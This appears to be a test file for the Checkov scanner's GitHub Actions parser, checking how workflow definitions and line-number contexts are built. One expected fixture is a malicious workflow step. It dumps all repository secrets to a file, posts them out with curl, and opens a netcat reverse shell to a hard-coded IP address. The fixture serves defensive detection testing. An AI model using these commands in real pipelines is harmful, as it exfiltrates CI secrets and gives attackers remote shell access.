from pathlib import Path

from checkov.common.graph.db_connectors.networkx.networkx_db_connector import NetworkxConnector
from checkov.common.graph.graph_builder import CustomAttributes
from checkov.common.graph.graph_builder.graph_components.block_types import BlockType
from checkov.common.runners.graph_manager import ObjectGraphManager
from checkov.github_actions.graph_builder.local_graph import GitHubActionsLocalGraph
from checkov.github_actions.runner import Runner
from checkov.github_actions.utils import get_gha_files_definitions, build_gha_definitions_context

RESOURCES_DIR = Path(__file__).parent / "resources"


def test_build_graph_from_definitions():
    # given
    test_file = str(RESOURCES_DIR / ".github/workflows/supply_chain.yaml")
    graph_manager = ObjectGraphManager(db_connector=NetworkxConnector(), source="GitHubActions")
    template, _ = Runner()._parse_file(f=test_file)

    # when
    local_graph = graph_manager.build_graph_from_definitions(
        definitions={test_file: template}, graph_class=GitHubActionsLocalGraph
    )

    # then
    assert len(local_graph.vertices) == 6
    assert len(local_graph.edges) == 2

    job_idx = local_graph.vertices_by_path_and_name[(test_file, "jobs.bridgecrew")]
    job = local_graph.vertices[job_idx]

    assert job.block_type == BlockType.RESOURCE
    assert job.id == "jobs.bridgecrew"
    assert job.source == "GitHubActions"
    assert job.attributes[CustomAttributes.RESOURCE_TYPE] == "jobs"
    assert job.config == {
        "runs-on": "ubuntu-latest",
        "steps": [
            {
                "name": "Run checkov",
                "id": "checkov",
                "uses": "bridgecrewio/checkov-action@master",
                "env": {
                    "GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}",
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                    "__startline__": 19,
                    "__endline__": 21,
                },
                "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > /dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
                "__startline__": 15,
                "__endline__": 25,
            }
        ],
        "__startline__": 13,
        "__endline__": 25,
    }


def test_get_definitions():
    definitions, definitions_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"),
                                                             files=[str(Path(
                                                                 __file__).parent / "gha/.github/workflows/failed.yaml")])
    assert len(definitions) == len(definitions_raw) == 1
    assert definitions[list(definitions.keys())[0]] == {
        "name": "read-only",
        "on": {
            "pull_request": {
                "types": ['opened', 'synchronize', 'labeled', 'unlabeled'],
                "__startline__": 5,
                "__endline__": 7
            },
            "__startline__": 4, "__endline__": 7
        },
        "permissions": "write-all",
        "jobs": {
            "example": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "uses": "actions/checkout@12345678",
                        "__startline__": 13,
                        "__endline__": 14,
                    },
                    {"run": 'echo "working hard"\n', "__startline__": 14, "__endline__": 16},
                ],
                "__startline__": 11,
                "__endline__": 16,
            },
            "__startline__": 10,
            "__endline__": 16,
        },
        "__startline__": 1,
        "__endline__": 16,
    }
    assert definitions_raw[list(definitions_raw.keys())[0]] == [
        (1, "name: read-only\n"),
        (2, "\n"),
        (3, 'on:\n'),
        (4, '  pull_request:\n'),
        (5, '    types: [ opened, synchronize, labeled, unlabeled ]\n'),
        (6, '\n'),
        (7, "permissions: write-all\n"),
        (8, "\n"),
        (9, "jobs:\n"),
        (10, "  example:\n"),
        (11, "    runs-on: ubuntu-latest\n"),
        (12, "    steps:\n"),
        (13, "      - uses: actions/checkout@12345678\n"),
        (14, "      - run: |\n"),
        (15, '          echo "working hard"\n'),
    ]


def test_build_def_context_on_list():
    defs, defs_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"),
                                               files=[
                                                   str(Path(__file__).parent / "gha/.github/workflows/on_list.yaml")])
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert context[list(context.keys())[0]] == {
        'on': {
            "['push', 'fork']": {
                'start_line': 2, 'end_line': 3, 'code_lines': [(2, 'on: [push, fork]\n')]
            }
        },
        'permissions': {
            'pull-requests': {
                'start_line': 5,
                'end_line': 7,
                'code_lines': [(5, '  pull-requests: read\n'), (6, '\n')]}},
        'jobs': {
            'form_filled': {
                'start_line': 9,
                'end_line': 30,
                'code_lines': [
                    (9, '    runs-on: ubuntu-latest\n'),
                    (10, "    if: contains(github.event.pull_request.title, '[FORM]') == false\n"),
                    (11, '    steps:\n'),
                    (12, '      - name: Checkout\n'),
                    (13, '        uses: actions/checkout@v3\n'),
                    (14, '      - name: Setup Python\n'),
                    (15, '        uses: actions/setup-python@v3\n'),
                    (16, '        with:\n'),
                    (17, "          python-version: '3.9'\n"),
                    (18, '      - name: Install Python Dependencies\n'),
                    (19, '        run: |\n'),
                    (20, '          python -m pip install --upgrade pip\n'),
                    (21, '          pip install pipenv==2021.5.29\n'),
                    (22, '          pipenv sync\n'),
                    (23, '      - name: Check form filled\n'),
                    (24, '        env:\n'),
                    (25, '          PR_NUMBER: ${{ github.event.pull_request.number }}\n'),
                    (26, '          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n'),
                    (27, '        run: |\n'),
                    (28, '          echo "Checking if contribution form needs to be filled for PR: $PR_NUMBER"\n'),
                    (29, '          pipenv run ./form.py --pr_number $PR_NUMBER\n')]}}}


def test_build_def_context_simple():
    defs, defs_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"),
                                               files=[str(Path(__file__).parent / "gha/.github/workflows/failed.yaml")])
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert context[list(context.keys())[0]] == {
        "on": {
            "pull_request": {
                "start_line": 5,
                "end_line": 7,
                "code_lines": [(5, "    types: [ opened, synchronize, labeled, unlabeled ]\n"), (6, '\n')]
            }
        },
        "permissions": {
            "write-all": {
                "start_line": 7,
                "end_line": 8,
                "code_lines": [(7, "permissions: write-all\n")]
            }
        },
        "jobs": {
            "example": {
                "start_line": 11,
                "end_line": 16,
                "code_lines": [
                    (11, "    runs-on: ubuntu-latest\n"),
                    (12, "    steps:\n"),
                    (13, "      - uses: actions/checkout@12345678\n"),
                    (14, "      - run: |\n"),
                    (15, '          echo "working hard"\n'),
                ],
            }
        },
    }


def test_build_def_context_multiple_on_directives():
    defs, defs_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"),
                                               files=[str(Path(__file__).parent / "gha/.github/workflows/multiple_on_descendants.yaml")])
    assert len(defs[list(defs.keys())[0]]) == 5
    on_block = defs[list(defs.keys())[0]]['on']
    assert len(on_block) == 4 and 'pull_request' in on_block and 'workflow_dispatch' in on_block
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert len(defs) == len(context)
    assert context[list(context.keys())[0]] == {
        'on': {
            'pull_request': {
                'start_line': 4,
                'end_line': 5,
                'code_lines': [(4, '    types: [ opened, synchronize, labeled, unlabeled ]\n')]
            }
        },
        'jobs': {
            'handle_branches': {
                'start_line': 9,
                'end_line': 27,
                'code_lines': [(9, '    runs-on: ubuntu-latest\n'),
                               (10, "    if: github.repository == 'org/content'\n"),
                               (11, '    steps:\n'),
                               (12, '      - name: Checkout\n'),
                               (13, '        uses: actions/checkout@v3\n'),
                               (14, '      - name: Setup Python\n'),
                               (15, '        uses: actions/setup-python@v3\n'),
                               (16, '        with:\n'),
                               (17, "          python-version: '3.9'\n"),
                               (18, '      - name: Install Python Dependencies\n'),
                               (19, '        run: |\n'),
                               (20, '          python -m pip install --upgrade pip\n'),
                               (21, '      - name: Delete Branches\n'),
                               (22, '        env:\n'),
                               (23, '          ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN }}\n'),
                               (24, '        run: |\n'),
                               (25, '          echo "Deleting branches"\n'),
                               (26, '          pipenv sync\n')]
            }
        }
    }


def test_build_def_context_1():
    defs = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-detection.yml": {
            "name": "Detection",
            "on": "pull_request",
            "jobs": {
                "detection": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.event.pull_request.head.repo.fork == false'",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 9, "__endline__": 11},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.8", "__startline__": 14, "__endline__": 15},
                            "__startline__": 11,
                            "__endline__": 15,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Green/setup-poetry@v7",
                            "__startline__": 15,
                            "__endline__": 17,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 17,
                            "__endline__": 20,
                        },
                        {
                            "name": "Run Detection",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "BRANCH_NAME": "${{ github.head_ref }}",
                                "USERNAME": "${{ secrets.TEST_SECRET_1 }}",
                                "PASSWORD": "${{ secrets.TEST_PASS_1 }}",
                                "__startline__": 22,
                                "__endline__": 26,
                            },
                            "run": 'echo "Run detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\ninvestigation_id=$(poetry run Utils/github_workflow_scripts/run_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME)\necho "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n',
                            "__startline__": 20,
                            "__endline__": 30,
                        },
                        {
                            "name": "Wait For Playbook To Finish",
                            "env": {
                                "MY_API_KEY": "my_api_key",
                                "__startline__": 32,
                                "__endline__": 33,
                            },
                            "run": 'echo "Invastigation id is: $INVESTIGATION_ID "\npoetry run python\n',
                            "__startline__": 30,
                            "__endline__": 38,
                        },
                    ],
                    "__startline__": 6,
                    "__endline__": 38,
                },
                "__startline__": 5,
                "__endline__": 38,
            },
            "__startline__": 1,
            "__endline__": 38,
        }
    }

    defs_raw = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-detection.yml": [
            (1, "name: Detection\n"),
            (2, "on: pull_request\n"),
            (3, "\n"),
            (4, "jobs:\n"),
            (5, "  detection:\n"),
            (6, "    runs-on: ubuntu-latest\n"),
            (7, "    if: github.event.pull_request.head.repo.fork == false'\n",),
            (8, "    steps:\n"),
            (9, "      - name: Checkout\n"),
            (10, "        uses: actions/checkout@v3\n"),
            (11, "      - name: Setup Python\n"),
            (12, "        uses: actions/setup-python@v3\n"),
            (13, "        with:\n"),
            (14, "          python-version: '3.8'\n"),
            (15, "      - name: Setup Poetry\n"),
            (16, "        uses: Green/setup-poetry@v7\n"),
            (17, "      - name: Install Python Dependencies\n"),
            (18, "        run: |\n"),
            (19, "          poetry install --with ci\n"),
            (20, "      - name: Run Detection\n"),
            (21, "        env:\n"),
            (22, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (23, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
            (24, "          USERNAME: ${{ secrets.TEST_SECRET_1 }}\n"),
            (25, "          PASSWORD: ${{ secrets.TEST_PASS_1 }}\n"),
            (26, "        run: |\n"),
            (27, '          echo "Run detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\n'),
            (28, "          investigation_id=$(poetry run Utils/github_workflow_scripts/run_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME)\n",),
            (29, '          echo "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n'),
            (30, "      - name: Wait For Playbook To Finish\n"),
            (31, "        env:\n"),
            (32, "          MY_API_KEY: my_api_key\n"),
            (33, "        run: |\n"),
            (34, '          echo "Invastigation id is: $INVESTIGATION_ID "\n'),
            (35, '          poetry run python\n'),
            (36, "\n"),
            (37, "\n"),
        ]
    }

    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert len(context) == len(defs)
    assert context == {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/run-detection.yml": {
            "on": {"pull_request": {"start_line": 2, "end_line": 3, "code_lines": [(2, 'on: pull_request\n')]}},
            "jobs": {
                "detection": {
                    "start_line": 6,
                    "end_line": 38,
                    "code_lines": [
                        (6, "    runs-on: ubuntu-latest\n"),
                        (7, "    if: github.event.pull_request.head.repo.fork == false'\n",),
                        (8, "    steps:\n"),
                        (9, "      - name: Checkout\n"),
                        (10, "        uses: actions/checkout@v3\n"),
                        (11, "      - name: Setup Python\n"),
                        (12, "        uses: actions/setup-python@v3\n"),
                        (13, "        with:\n"),
                        (14, "          python-version: '3.8'\n"),
                        (15, "      - name: Setup Poetry\n"),
                        (16, "        uses: Green/setup-poetry@v7\n"),
                        (17, "      - name: Install Python Dependencies\n"),
                        (18, "        run: |\n"),
                        (19, "          poetry install --with ci\n"),
                        (20, "      - name: Run Detection\n"),
                        (21, "        env:\n"),
                        (22, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (23, "          BRANCH_NAME: ${{ github.head_ref }}\n"),
                        (24, "          USERNAME: ${{ secrets.TEST_SECRET_1 }}\n"),
                        (25, "          PASSWORD: ${{ secrets.TEST_PASS_1 }}\n"),
                        (26, "        run: |\n"),
                        (27, '          echo "Run detection for PR: $PR_NUMBER on branch: $BRANCH_NAME"\n'),
                        (28, "          investigation_id=$(poetry run Utils/github_workflow_scripts/run_detection.py --pr_number $PR_NUMBER --branch_name $BRANCH_NAME)\n",),
                        (29, '          echo "INVESTIGATION_ID=$investigation_id" >> $GITHUB_ENV\n'),
                        (30, "      - name: Wait For Playbook To Finish\n"),
                        (31, "        env:\n"),
                        (32, "          MY_API_KEY: my_api_key\n"),
                        (33, "        run: |\n"),
                        (34, '          echo "Invastigation id is: $INVESTIGATION_ID "\n'),
                        (35, '          poetry run python\n'),
                        (36, "\n"),
                        (37, "\n"),
                    ],
                }
            }
        }
    }


def test_build_def_context_2():
    defs = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-build.yml": {
            "name": "Trigger Build",
            "on": {
                "pull_request_target": {"types": ["labeled"], "__startline__": 4, "__endline__": 6},
                "__startline__": 3,
                "__endline__": 6,
            },
            "jobs": {
                "trigget_build": {
                    "runs-on": "ubuntu-latest",
                    "if": "github.event.pull_request.head.repo.fork == true",
                    "steps": [
                        {"name": "Checkout", "uses": "actions/checkout@v3", "__startline__": 11, "__endline__": 13},
                        {
                            "name": "Setup Python",
                            "uses": "actions/setup-python@v3",
                            "with": {"python-version": "3.9", "__startline__": 16, "__endline__": 17},
                            "__startline__": 13,
                            "__endline__": 17,
                        },
                        {
                            "name": "Setup Poetry",
                            "uses": "Green/setup-poetry@v7",
                            "__startline__": 17,
                            "__endline__": 19,
                        },
                        {
                            "name": "Install Python Dependencies",
                            "run": "poetry install --with ci\n",
                            "__startline__": 19,
                            "__endline__": 22,
                        },
                        {
                            "name": "Trigger Build",
                            "env": {
                                "PR_NUMBER": "${{ github.event.pull_request.number }}",
                                "BASE_BRANCH": "${{ github.event.pull_request.base.ref }}",
                                "CONTRIB_BRANCH": "${{ github.event.pull_request.head.label }}",
                                "USERNAME": "${{ secrets.TRIGGER_BUILD_USER }}",
                                "PASSWORD": "${{ secrets.TRIGGER_BUILD_PASSWORD }}",
                                "__startline__": 24,
                                "__endline__": 29,
                            },
                            "run": 'echo "Trigger build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\npoetry run python\n',
                            "__startline__": 22,
                            "__endline__": 32,
                        },
                    ],
                    "__startline__": 8,
                    "__endline__": 32,
                },
                "__startline__": 7,
                "__endline__": 32,
            },
            "__startline__": 1,
            "__endline__": 32,
        }
    }

    defs_raw = {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-build.yml": [
            (1, "name: Trigger Build\n"),
            (2, "on:\n"),
            (3, "  pull_request_target:\n"),
            (4, "    types: [labeled]\n"),
            (5, "\n"),
            (6, "jobs:\n"),
            (7, "  trigget_build:\n"),
            (8, "    runs-on: ubuntu-latest\n"),
            (9, "    if: github.event.pull_request.head.repo.fork == true\n",),
            (10, "    steps:\n"),
            (11, "      - name: Checkout\n"),
            (12, "        uses: actions/checkout@v3\n"),
            (13, "      - name: Setup Python\n"),
            (14, "        uses: actions/setup-python@v3\n"),
            (15, "        with:\n"),
            (16, "          python-version: '3.9'\n"),
            (17, "      - name: Setup Poetry\n"),
            (18, "        uses: Green/setup-poetry@v7\n"),
            (19, "      - name: Install Python Dependencies\n"),
            (20, "        run: |\n"),
            (21, "          poetry install --with ci\n"),
            (22, "      - name: Trigger Build\n"),
            (23, "        env:\n"),
            (24, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
            (25, "          BASE_BRANCH: ${{ github.event.pull_request.base.ref }}\n"),
            (26, "          CONTRIB_BRANCH: ${{ github.event.pull_request.head.label }}\n"),
            (27, "          USERNAME: ${{ secrets.TRIGGER_BUILD_USER }}\n"),
            (28, "          PASSWORD: ${{ secrets.TRIGGER_BUILD_PASSWORD }}\n"),
            (29, "        run: |\n"),
            (30, '          echo "Trigger build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\n',),
            (31, "          poetry run python\n",),
        ]
    }
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert len(context) == len(defs)
    assert context == {
        "/tmp/checkov/tempo/blue/master/src/.github/workflows/trigger-build.yml": {
            "on": {"pull_request_target": {"start_line": 4, "end_line": 6,
                                           "code_lines": [(4, "    types: [labeled]\n"), (5, "\n")]}},
            "jobs": {
                "trigget_build": {
                    "start_line": 8,
                    "end_line": 32,
                    "code_lines": [
                        (8, "    runs-on: ubuntu-latest\n"),
                        (9, "    if: github.event.pull_request.head.repo.fork == true\n",),
                        (10, "    steps:\n"),
                        (11, "      - name: Checkout\n"),
                        (12, "        uses: actions/checkout@v3\n"),
                        (13, "      - name: Setup Python\n"),
                        (14, "        uses: actions/setup-python@v3\n"),
                        (15, "        with:\n"),
                        (16, "          python-version: '3.9'\n"),
                        (17, "      - name: Setup Poetry\n"),
                        (18, "        uses: Green/setup-poetry@v7\n"),
                        (19, "      - name: Install Python Dependencies\n"),
                        (20, "        run: |\n"),
                        (21, "          poetry install --with ci\n"),
                        (22, "      - name: Trigger Build\n"),
                        (23, "        env:\n"),
                        (24, "          PR_NUMBER: ${{ github.event.pull_request.number }}\n"),
                        (25, "          BASE_BRANCH: ${{ github.event.pull_request.base.ref }}\n"),
                        (26, "          CONTRIB_BRANCH: ${{ github.event.pull_request.head.label }}\n"),
                        (27, "          USERNAME: ${{ secrets.TRIGGER_BUILD_USER }}\n"),
                        (28, "          PASSWORD: ${{ secrets.TRIGGER_BUILD_PASSWORD }}\n"),
                        (29, "        run: |\n"),
                        (30, '          echo "Trigger build for PR: $PR_NUMBER with base branch: $BASE_BRANCH contrib branch: $CONTRIB_BRANCH"\n',),
                        (31, "          poetry run python\n",),
                    ],
                }
            }
        }
    }
